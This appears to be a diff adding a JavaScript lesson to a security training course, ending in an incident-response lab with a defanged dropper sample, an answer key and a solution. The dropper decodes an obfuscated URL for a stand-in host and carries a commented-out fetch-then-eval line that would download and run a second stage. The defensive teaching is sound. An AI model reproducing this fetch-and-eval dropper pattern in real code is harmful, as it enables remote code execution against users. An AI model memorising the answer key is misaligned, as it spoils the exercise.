@@ -1,0 +1,116 @@
+tagline: The language of the browser, and of a lot of malware droppers. Learn JavaScript from first values to closures, run real code in the sandbox, then decode an obfuscated payload.
+:: simple
+JavaScript runs in every browser and, through Node.js, on servers. A program is a list of statements. You store values in variables with `const` (can't be reassigned) or `let` (can), and print them with `console.log`.
+
+The sandbox runs real JavaScript with `node -e '<code>'`:
+
+```
+$ node -e 'const name = "0xDay"; console.log("hello, " + name)'
+$ node -e 'console.log(7 * 6, typeof 42, typeof "42")'
+```
+
+A **function** is a reusable block that takes inputs and returns an output:
+
+```
+$ node -e 'function double(n) { return n * 2 } console.log(double(21))'
+```
+
+> **TypeScript** is JavaScript plus type labels (`function double(n: number): number`). The compiler checks the types and then strips them out, so what actually runs is plain JavaScript.
+:: mid
+Most real JavaScript is moving data around: **arrays** (lists), **objects** (key/value records) and **JSON** (objects as text, the format every web API speaks).
+
+The three array methods you'll see everywhere:
+- `map` transforms every item
+- `filter` keeps items that pass a test
+- `reduce` folds the list into one value
+
+`ports.js` in the sandbox holds a fake scan result. Read it, then run it:
+
+```
+$ cat ports.js
+$ node ports.js
+```
+
+Arrow functions (`p => p.open`) are just short functions. Template strings use backticks and `${}`:
+
+```
+$ node -e 'const hosts = ["10.0.0.5", "10.0.0.9"]; hosts.map((h, i) => console.log(`${i}: ${h}`))'
+$ node -e 'console.log(JSON.stringify({ user: "nathan", admin: false }))'
+```
+:: complex
+### 1. Strings are just numbers
+Every character has a numeric code. `"A".charCodeAt(0)` is 65, and `String.fromCharCode(65)` is "A". That's the basis of almost every obfuscation trick: shift, XOR or encode the codes so the text doesn't look like a URL anymore.
+
+```
+$ node -e 'console.log([..."hi"].map(c => c.charCodeAt(0)))'
+$ node -e 'console.log(String.fromCharCode(104, 105))'
+```
+
+### 2. XOR and base64
+XOR (`^`) flips bits with a key, and XOR-ing twice with the same key gives you the original back: `(c ^ k) ^ k === c`. Base64 (`btoa` / `atob`) turns bytes into safe printable text. Droppers often stack them: XOR the URL, then base64 it.
+
+```
+$ node -e 'const k = 0x2a; const x = 104 ^ k; console.log(x, x ^ k)'
+$ node -e 'console.log(btoa("hi"), atob("aGk="))'
+```
+
+### 3. Closures, async and why attackers love eval
+- A **closure** is a function that remembers variables from where it was created, the trick behind private state and module patterns
+- `async`/`await` lets code wait on network calls without freezing the page
+- `eval(string)` runs a string as code, so a dropper only needs to *decode* a string and `eval` it. As an analyst you do the opposite: swap `eval` for `console.log` and read what it would have run
+
+> Never run an unknown script to "see what it does". Copy only the decoding logic, and print instead of executing.
+:: lab
+host: ir-box
+user: student
+cwd: /home/student
+js: yes
+:: brief
+A user opened `invoice.html` and this script ran. It's in `~/dropper.js`. **Don't run it.**
+
+It hides the address of its second stage. Finish the decoder in `~/decode.js` (open it with `nano decode.js`, save with Ctrl+S, exit with Ctrl+X), run it with `node decode.js`, and find out where the payload comes from.
+
+Submit the **domain name** it downloads from, e.g. `submit evil.example.com`.
+:: answer
+update-cdn.example-cdn.net
+https://update-cdn.example-cdn.net/stage2.ps1
+:: hint
+Read `dropper.js`. The blob is base64, and the loop XORs every character code with a key. Which key?
+:: hint
+Decoding is the same steps in reverse order: first `atob(blob)`, then XOR each character code with `0x2a`, then rebuild the string with `String.fromCharCode`.
+:: hint
+In decode.js: `const out = [...atob(blob)].map(c => String.fromCharCode(c.charCodeAt(0) ^ key)).join(""); console.log(out)`
+:: solution
+`dropper.js` builds the URL with `atob` then XOR `0x2a`, then hands it to `fetch` and `eval`. XOR undoes itself, so the decoder is:
+
+`[...atob(blob)].map(c => String.fromCharCode(c.charCodeAt(0) ^ 0x2a)).join("")`
+
+which prints **https://update-cdn.example-cdn.net/stage2.ps1**. The domain **update-cdn.example-cdn.net** is your indicator of compromise: block it at the proxy and DNS, and search the proxy logs for anyone else who reached it. A `.ps1` second stage means the next step was PowerShell, so pull that machine's PowerShell logs (Event ID 4104) too.
+:: file /home/student/dropper.js
+// recovered from invoice.html (defanged: the fetch target is never reached)
+(function () {
+  var b = "Ql5eWlkQBQVfWk5LXk8HSU5EBE9SS0daRk8HSU5EBERPXgVZXktNTxgEWlkb";
+  var k = 0x2a, s = "";
+  var r = atob(b);
+  for (var i = 0; i < r.length; i++) s += String.fromCharCode(r.charCodeAt(i) ^ k);
+  // fetch(s).then(function (x) { return x.text(); }).then(eval);
+})();
+:: file /home/student/decode.js
+// decode the dropper's hidden URL without running the dropper
+const blob = "Ql5eWlkQBQVfWk5LXk8HSU5EBE9SS0daRk8HSU5EBERPXgVZXktNTxgEWlkb";
+const key = 0; // TODO: what key does dropper.js use?
+
+// TODO: base64-decode the blob, XOR every character code with the key,
+// and print the result with console.log
+console.log("decoder not finished yet");
+:: file /home/student/ports.js
+const scan = [
+  { port: 22, service: "ssh", open: true },
+  { port: 80, service: "http", open: true },
+  { port: 443, service: "https", open: false },
+  { port: 3389, service: "rdp", open: true }
+];
+const open = scan.filter(p => p.open);
+console.log("open:", open.map(p => p.port).join(", "));
+console.log("count:", open.reduce((n) => n + 1, 0));
+console.log(JSON.stringify(open[0]));
